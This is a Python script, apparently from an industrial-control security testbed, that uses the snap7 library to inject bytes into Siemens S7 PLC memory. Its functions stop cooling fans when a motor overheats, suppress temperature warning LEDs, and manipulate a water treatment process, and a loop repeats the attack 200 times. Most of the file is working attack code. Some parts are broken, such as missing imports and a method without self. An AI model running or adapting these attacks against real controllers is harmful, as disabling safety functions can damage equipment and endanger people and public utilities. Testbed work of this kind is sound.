from snap7.client import Client
# import numpy as np
import time
from random import *

DELAY = 2


class S7PLCConnector:

    def __init__(self, ip_address, reads=None, writes=None, avg_packet_lengths=None, classifier=None):
        self.ip_address = ip_address
        self.__prev_counters = None
        self.clf = classifier
        self.reads = reads
        self.writes = writes
        self.avg_packet_lengths = avg_packet_lengths

    @staticmethod
    def confirm_on_network(host, port, rack, slot):
        cli = Client()
        try:
            cli.connect(host, rack, slot)
            return cli.get_connected()
        except RuntimeError:
            return False

    def write_in_chunks(f, lst, n):
        for i in range(0, len(lst), n):
            chunk = lst[i : i+n]
            f.write(" ".join(str(val) for val in chunk) + "\n")

    @staticmethod
    def check_calibrated(host):
        return os.path.exists("models/S7_{}.joblib".format(hashlib.sha256(host.encode("utf-8")).hexdigest()))


#  ******************************************************************************************
#  ****************************** Code Inejction Attack ******************************
#  ******************************************************************************************
    # ATTACK Part 1 - for PLC 192.168.9.111 to prevent fans from activating when motor is overheating
    def attack_injection_fan_controller(self, rack, slot):
        try:
            b = bytes([0x90])
            client = Client()
            client.connect(self.ip_address, rack, slot)
            attack = client.mb_write(0, 1, b)
        finally:
            client.disconnect()
            client.destroy()

    # ATTACK Part 2 - for PLC 192.168.9.114 to stop amber and red LEDs activiating when temperature high
    def attack_injection_temp_controller(self, rack, slot):
        try:
            b = bytes([0x10])
            client = Client()
            client.connect(self.ip_address, rack, slot)
            attack = client.mb_write(0, 1, b)
        finally:
            client.disconnect()
            client.destroy()

    # ATTACK S7-300 GULP - for PLC 192.168.5.22 to attack water treatment process through targeted register manipulation
    def attack_injection_water_treatment(self, rack, slot):
        try:
            b = bytes([0x66])
            client = Client()
            client.connect(self.ip_address, rack, slot)
            attack = client.mb_write(0, 1, b)
        finally:
            client.disconnect()
            client.destroy()

        # ATTACK S7-300 GULP - for PLC 192.168.5.22 to randomly manipulate PLC registers
    def attack_injection_water_treatment_random(self, rack, slot, random_reg_int):
        reglist = []
        try:
            print(random_reg_int)
            rstring = str(random_reg_int)
            random_reg_hex = int("0x" + rstring, 16)
            print(random_reg_hex)
            reglist.append(random_reg_hex)

            b = bytes(reglist)
            client = Client()
            client.connect(self.ip_address, rack, slot)
            attack = client.mb_write(0, 1, b)
        finally:
            client.disconnect()
            client.destroy()

     # MEMORY RESET - Returns memory values of specified PLC to 0x00.
    def reset_mem(self, rack, slot):
        try:
            b = bytes([0x00])
            client = Client()
            client.connect(self.ip_address, rack, slot)
            attack = client.mb_write(0, 1, b)
        finally:
            client.disconnect()
            client.destroy()
#  ******************************************************************************************
#  ******************************************************************************************
#  ******************************************************************************************


a = S7PLCConnector("192.168.9.111")
b = S7PLCConnector("192.168.9.114")
# c = S7PLCConnector("192.168.5.22") # S7-300 GULP

status = input("Select option: 1 (perform memory attack), 2 (perform memory reset)")
i = 0
random_reg_int = randint(50, 100)
print("Attack started. To end attack, enter 'y'. ")
while i < 200:
    if status == "1":
        time.sleep(1.5)
        try:
            attack1 = a.attack_injection_fan_controller(0, 1)
            attack2 = b.attack_injection_temp_controller(0, 1)
            # attack = c.attack_injection_water_treatment_random(0, 2, random_reg_int)
            i += 1
        except RuntimeError:
            ("Re-trying attack")
    elif status == '2':
        print("Attack Ended - Memory Reset")
        a = S7PLCConnector("192.168.9.111")
        b = S7PLCConnector("192.168.9.114")
        reset1 = a.reset_mem(0, 1)
        reset2 = b.reset_mem(0, 1)
        break;
